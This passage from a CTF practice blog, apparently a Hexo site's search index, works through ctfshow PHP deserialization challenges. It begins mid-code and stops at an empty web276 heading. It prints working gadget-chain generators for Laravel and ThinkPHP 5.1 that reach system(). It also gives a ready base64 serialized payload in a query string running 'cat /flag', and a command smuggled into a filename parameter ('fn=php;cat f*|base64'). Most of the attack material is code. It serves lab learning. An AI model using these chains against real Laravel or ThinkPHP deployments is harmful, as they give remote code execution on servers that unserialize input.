 use Mockery\Generator\MockDefinition;</span><br><span class="line"></span><br><span class="line">    class QueuedCommand</span><br><span class="line">    &#123;</span><br><span class="line">        public $connection;</span><br><span class="line">        public function __construct()&#123;</span><br><span class="line">            $this-&gt;connection=new MockDefinition();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace Illuminate\Bus&#123;</span><br><span class="line"></span><br><span class="line">    use Mockery\Loader\EvalLoader;</span><br><span class="line"></span><br><span class="line">    class Dispatcher</span><br><span class="line">    &#123;</span><br><span class="line">        protected $queueResolver;</span><br><span class="line">        public function __construct()&#123;</span><br><span class="line">            $this-&gt;queueResolver=[new EvalLoader(),&#x27;load&#x27;];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace Mockery\Loader&#123;</span><br><span class="line">    class EvalLoader</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace Mockery\Generator&#123;</span><br><span class="line">    class MockConfiguration</span><br><span class="line">    &#123;</span><br><span class="line">        protected $name=&quot;feng&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    class MockDefinition</span><br><span class="line">    &#123;</span><br><span class="line">        protected $config;</span><br><span class="line">        protected $code;</span><br><span class="line">        public function __construct()</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;code=&quot;&lt;?php system(&#x27;cat /flag&#x27;);exit()?&gt;&quot;;</span><br><span class="line">            $this-&gt;config=new MockConfiguration();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace&#123;</span><br><span class="line"></span><br><span class="line">    use Illuminate\Broadcasting\PendingBroadcast;</span><br><span class="line"></span><br><span class="line">    echo urlencode(serialize(new PendingBroadcast()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">//payload2</span><br><span class="line">&lt;?php</span><br><span class="line">namespace Faker&#123;</span><br><span class="line">    class Generator&#123;</span><br><span class="line">        protected $formatters;</span><br><span class="line">        public function __construct()</span><br><span class="line">        &#123;</span><br><span class="line">            $this -&gt; formatters = [&#x27;dispatch&#x27; =&gt; &#x27;system&#x27;];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace Illuminate\Broadcasting&#123;</span><br><span class="line">    use Faker\Generator;</span><br><span class="line">    class PendingBroadcast&#123;</span><br><span class="line">        protected $events;</span><br><span class="line">        protected $event;</span><br><span class="line">        public function __construct()</span><br><span class="line">        &#123;</span><br><span class="line">            $this -&gt; events = new Generator();</span><br><span class="line">            $this -&gt; event = &#x27;cat /flag&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $a = new PendingBroadcast();</span><br><span class="line">    $res = serialize($a);</span><br><span class="line">    echo urlencode($res);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="web274"><a href="#web274" class="headerlink" title="web274"></a>web274</h1><p><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1747061492185.png"></p><p>thinkphp5.1的框架，源代码中注释有<code>@unserialize(base64_decode(\$_GET[&#39;data&#39;]))</code></p><p>搜索thinkphp5.1反序列化的漏洞</p><p><a href="https://www.cnblogs.com/zpchcbd/p/12642225.html">Thinkphp 5.1.37 反序列化利用链 - zpchcbd - 博客园</a></p><p>__wakeup 一定会调用</p><p>__destruct 一定会调用</p><p>__toString 当一个对象被反序列化后又被当做字符串使用</p><p><strong>反序列化的常见中间跳板:</strong></p><p>__toString 当一个对象被当做字符串使用</p><p>__get 读取不可访问或不存在属性时被调用</p><p>__set 当给不可访问或不存在属性赋值时被调用</p><p>__isset 对不可访问或不存在的属性调用isset()或empty()时被调用</p><p>形如 this-&gt;func();</p><p><strong>反序列化的常见终点:</strong></p><p>__call 调用不可访问或不存在的方法时被调用</p><p>call_user_func 一般php代码执行都会选择这里</p><p>call_user_func_array 一般php代码执行都会选择这里</p><p>现在又多了<strong>phar反序列化的利用方式</strong>，能够反序列化其metadata部分，利用的范围增加了许多！</p><p>使用上文的payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">namespace think;</span><br><span class="line">class Request&#123;</span><br><span class="line">    protected $hook = [];</span><br><span class="line">    protected $filter = &quot;system&quot;;</span><br><span class="line">    protected $config;</span><br><span class="line">    function __construct()&#123;</span><br><span class="line">        $this-&gt;filter = &quot;system&quot;;</span><br><span class="line">        $this-&gt;config = [&quot;var_ajax&quot;=&gt;&#x27;ta3shi&#x27;];</span><br><span class="line">        $this-&gt;hook = [&quot;visible&quot;=&gt;[$this,&quot;isAjax&quot;]];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">abstract class Model&#123;</span><br><span class="line">    protected $append = [];</span><br><span class="line">    private $data = [];</span><br><span class="line">    function __construct()&#123;</span><br><span class="line">        # append键必须存在，并且与$this-&gt;data相同</span><br><span class="line">        $this-&gt;append = [&quot;ta3shi&quot;=&gt;[]];</span><br><span class="line">        $this-&gt;data = [&quot;ta3shi&quot;=&gt;new Request()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think\model;</span><br><span class="line"></span><br><span class="line">use think\Model;</span><br><span class="line"></span><br><span class="line">class Pivot extends Model</span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think\process\pipes;</span><br><span class="line">use think\model\Pivot;</span><br><span class="line"></span><br><span class="line">class Windows</span><br><span class="line">&#123;</span><br><span class="line">    private $files = [];</span><br><span class="line"></span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;files=[new Pivot()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">//var_dump(new Windows());</span><br><span class="line">echo base64_encode(serialize(new Windows()));</span><br><span class="line"></span><br><span class="line">// TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6Mjp7czo5OiIAKgBhcHBlbmQiO2E6MTp7czo0OiJodWhhIjthOjA6e319czoxNzoiAHRoaW5rXE1vZGVsAGRhdGEiO2E6MTp7czo0OiJodWhhIjtPOjEzOiJ0aGlua1xSZXF1ZXN0IjozOntzOjc6IgAqAGhvb2siO2E6MTp7czo3OiJ2aXNpYmxlIjthOjI6e2k6MDtyOjc7aToxO3M6NjoiaXNBamF4Ijt9fXM6OToiACoAZmlsdGVyIjtzOjY6InN5c3RlbSI7czo5OiIAKgBjb25maWciO2E6MTp7czo4OiJ2YXJfYWpheCI7czo0OiJodWhhIjt9fX19fX0=</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><code>?data=TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6Mjp7czo5OiIAKgBhcHBlbmQiO2E6MTp7czo0OiJodWhhIjthOjA6e319czoxNzoiAHRoaW5rXE1vZGVsAGRhdGEiO2E6MTp7czo0OiJodWhhIjtPOjEzOiJ0aGlua1xSZXF1ZXN0IjozOntzOjc6IgAqAGhvb2siO2E6MTp7czo3OiJ2aXNpYmxlIjthOjI6e2k6MDtyOjc7aToxO3M6NjoiaXNBamF4Ijt9fXM6OToiACoAZmlsdGVyIjtzOjY6InN5c3RlbSI7czo2OiJjb25maWciO2E6MTp7czo4OiJ2YXJfYWpheCI7czo0OiJodWhhIjt9fX19fX0&amp;ta3shi[]=cat /flag</code></p><h1 id="web275"><a href="#web275" class="headerlink" title="web275"></a>web275</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">class filter&#123;</span><br><span class="line">    public $filename;</span><br><span class="line">    public $filecontent;</span><br><span class="line">    public $evilfile=false;</span><br><span class="line"></span><br><span class="line">    public function __construct($f,$fn)&#123;</span><br><span class="line">        $this-&gt;filename=$f;</span><br><span class="line">        $this-&gt;filecontent=$fn;</span><br><span class="line">    &#125;</span><br><span class="line">    public function checkevil()&#123;</span><br><span class="line">        if(preg_match(&#x27;/php|\.\./i&#x27;, $this-&gt;filename))&#123;</span><br><span class="line">            $this-&gt;evilfile=true;</span><br><span class="line">        &#125;</span><br><span class="line">        if(preg_match(&#x27;/flag/i&#x27;, $this-&gt;filecontent))&#123;</span><br><span class="line">            $this-&gt;evilfile=true;</span><br><span class="line">        &#125;</span><br><span class="line">        return $this-&gt;evilfile;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        if($this-&gt;evilfile)&#123;</span><br><span class="line">            system(&#x27;rm &#x27;.$this-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;fn&#x27;]))&#123;</span><br><span class="line">    $content = file_get_contents(&#x27;php://input&#x27;);</span><br><span class="line">    $f = new filter($_GET[&#x27;fn&#x27;],$content);</span><br><span class="line">    if($f-&gt;checkevil()===false)&#123;</span><br><span class="line">        file_put_contents($_GET[&#x27;fn&#x27;], $content);</span><br><span class="line">        copy($_GET[&#x27;fn&#x27;],md5(mt_rand()).&#x27;.txt&#x27;);</span><br><span class="line">        unlink($_SERVER[&#x27;DOCUMENT_ROOT&#x27;].&#x27;/&#x27;.$_GET[&#x27;fn&#x27;]);</span><br><span class="line">        echo &#x27;work done&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &#x27;where is flag?&#x27;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在<code>_destruct</code>函数中执行system，fn含有php，使用分号隔开就可以执行命令了</p><p><code>fn=php;cat f*|base64</code></p><h1 id="web276"><a href="#web276" class="headerlink" title="web276"></a>web276</h1>]]></content>
      
      
      <categories>
          
          <category> ctf练习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 反序列化 </tag>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
